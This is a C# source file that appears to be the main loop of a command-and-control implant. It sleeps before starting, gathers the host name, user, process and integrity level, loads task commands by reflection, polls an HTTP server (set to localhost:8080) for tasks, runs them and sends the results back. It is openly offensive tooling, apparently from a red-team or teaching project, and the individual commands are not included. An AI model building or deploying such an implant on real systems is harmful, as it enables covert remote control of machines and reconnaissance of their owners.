using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent
{
    class Program
    {

        private static AgentMetada _metadata; 

        private static CommModule _commModule;

        private static CancellationTokenSource _tokensource;

        private static List<AgentCommand> _commands = new List<AgentCommand>();

        static void Main(string[] args)
        {

            Thread.Sleep(20000);
            GenerateMetaData();
            LoadAgentCommands();



            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start(); 



            _tokensource = new CancellationTokenSource();

            while (!_tokensource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    //action tasks
                    HandleTasks(tasks);
                }
            }
        }

        //public void Stop()
        //{
        //    _tokensource.Cancel();
        //}
        static void GenerateMetaData()
        {
            var process = Process.GetCurrentProcess();

            var username = Environment.UserName;

            var integrity = "Medium";

            if (username.Equals("SYSTEM"))
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }




            _metadata = new AgentMetada()
            {
                Id = Guid.NewGuid().ToString(),
                HostName = Environment.MachineName,
                Username = username,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity= integrity,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            };
        }


        private static  void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks) 
            {
                HandleTask(task);
            }
        }


        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.command, StringComparison.OrdinalIgnoreCase));
            if (command is null)
            {
                SendTaskResult(task.Id, "Command not found");
                return;
            }

            try
            {
                var result = command.Execute(task);
                SendTaskResult(task.Id, result);
            }

            catch (Exception e)
            {
                SendTaskResult(task.Id, e.Message);
            }
        }  

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new AgentTaskResults
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }




        public void Stop()
        {
            _tokensource.Cancel();
        }


        private static void LoadAgentCommands()
        {
            var self = System.Reflection.Assembly.GetExecutingAssembly();
            
            foreach(var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand)Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            } 
        
        
        }

    }
}
